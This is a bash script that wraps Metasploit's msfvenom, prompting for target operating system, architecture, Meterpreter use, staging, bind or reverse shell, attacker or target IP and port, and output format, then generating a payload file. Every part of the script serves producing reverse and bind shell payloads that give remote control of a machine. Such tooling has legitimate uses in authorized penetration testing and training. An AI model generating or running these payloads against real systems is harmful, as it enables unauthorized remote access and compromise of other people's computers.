#!/bin/bash
#A script that creates a wrapper around MSFvenom and allows for easier payload generation.

validate_os(){
echo "What is the target of your operating system? Example: windows, linux, osx"
read OS
case  $OS in 
        windows|linux|osx)
        ;;
        *)
        echo "$OS is not one of the options. Please enter windows, linux, or osx."
        validate_os
        ;;
esac
}

validate_os
###########################################################################
validate_arc(){
echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture
case $architecture in 
	32|64)
	;;
	*)
	echo "$architecture is not one of the options."
	validate_arc
	;;
esac
}

validate_arc
############################################################################
no_arc_display(){
case $OS in
        windows)
                arc=""
        ;;
esac
}
#############################################################################
meterpreter_question(){
echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter
case $meterpreter in 
	y|n)
	;;
	*)
	echo "$meterpreter is not one of the options."
	meterpreter_question
	;;
esac
}
#############################################################################
linux_x86_meterpreter(){
case  $OS in
	linux|windows)
		meterpreter_question
	;;
	osx)
		meterpreter='n'
	;;
esac
}
#############################################################################
validate_stage(){
echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless."
read stage
case $stage in 
	1|2)
	;;
	*)
	echo "$stage is not one of the options."
	validate_stage
	;;
esac
}

validate_stage
#############################################################################
stage_symbol=""

case $stage in
	1)
		stage_symbol="/"
	;;
	2)
		stage_symbol="_"
	;;
esac

case $architecture in
	32)
		arc="/x86"
		no_arc_display
		linux_x86_meterpreter
	;;

	64)
		arc="/x64"
		meterpreter_question
	;;
esac
############################################################################
validate_shell(){
echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell
case $shell in 
	bind|reverse)
	;;
	*)
	echo "$shell is not one of the options."
	validate_shell
	;;
esac
}

validate_shell
##############################################################################
correct_ip="false"
check_ip(){
octet="(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])"
if [[ $ip =~ ^$octet.$octet.$octet.$octet$ ]];
then
	correct_ip="true"
else
	echo "$ip is not a valid IP address. Please enter a valid IP address."
	read ip
fi
}

find_correct_ip(){
while [ "$correct_ip" = "false" ];
do
	check_ip
done
}
############################################################################
correct_port="false"
check_port() {
if [[ $port -gt 65535 ]] || [[ $port -lt 1 ]];
then
	echo "$port is not a valid port number. Please choose a number between 1 and 65,535."
	read port
else
	correct_port="true"
fi
}

find_correct_port(){
while [ "${correct_port}" = "false" ];
do
	check_port;
done
}

#############################################################################
ip_port=""

case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
	check_ip
	find_correct_ip
        echo "Please enter the port you would like to listen on."
        read port
	check_port
	find_correct_port
	ip_port="LHOST=$ip LPORT=$port"
    ;;
  bind)
        echo "Please enter your target's IP address."
	read ip
	check_ip
        find_correct_ip
	echo "Please enter the port you want your target to listen on."
        read port
	check_port
	find_correct_port
	ip_port="RHOST=$ip RPORT=$port"
    ;;
esac
#############################################################################
validate_form(){
echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
read format
case $format in 
	exe|raw|pl|rb|c|elf)
	;;
	*)
	echo "$format is not one of the options."
	validate_form
	;;
esac
}

validate_form
#############################################################################
payload=""
msfgen=""

echo "What would you like to name the file?"
read filename
#############################################################################
use_meterpreter() {
	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}

no_meterpreter() {
        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}

case  $meterpreter  in
	y)
	payload="${OS}${arc}/meterpreter"
	use_meterpreter
	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
        ;;
	n)
	payload="${OS}${arc}/shell"
	no_meterpreter
	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
        ;;
	*)
esac
###############################################################################
echo "msfvenom -p $msfgen"

msfvenom -p $msfgen > ${filename}.${format}
